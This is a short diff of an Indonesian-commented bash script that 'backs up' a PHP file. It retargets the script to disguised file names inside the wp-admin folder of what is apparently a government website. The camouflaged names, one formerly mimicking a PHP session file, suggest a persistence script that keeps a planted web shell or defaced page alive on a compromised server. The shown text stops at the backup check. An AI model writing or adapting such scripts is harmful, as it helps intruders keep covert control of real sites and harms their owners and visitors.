@@ -1,13 +1,13 @@
 #!/bin/bash
 
 # Definisikan lokasi file index.php
-INDEX_FILE="/home/shirinba/public_html/index.php"
+INDEX_FILE="/var/www/creps.gov.mz/creps/wp-admin/user/data/base_folder.data_bash.php"
 # Definisikan lokasi folder backup
-BACKUP_FOLDER="/home/shirinba/tmp/"
+BACKUP_FOLDER="/var/www/creps.gov.mz/creps/wp-admin/user/"
 # Buat folder backup jika belum ada
 mkdir -p "$BACKUP_FOLDER"
 # Tentukan nama file backup
-BACKUP_FILE="$BACKUP_FOLDER/sess_07996f2a27e7566638b10befa7ed6bf11111"
+BACKUP_FILE="$BACKUP_FOLDER/data_logs"
 
 # Backup file index.php jika belum ada backup
 if [ ! -f "$BACKUP_FILE" ]; then
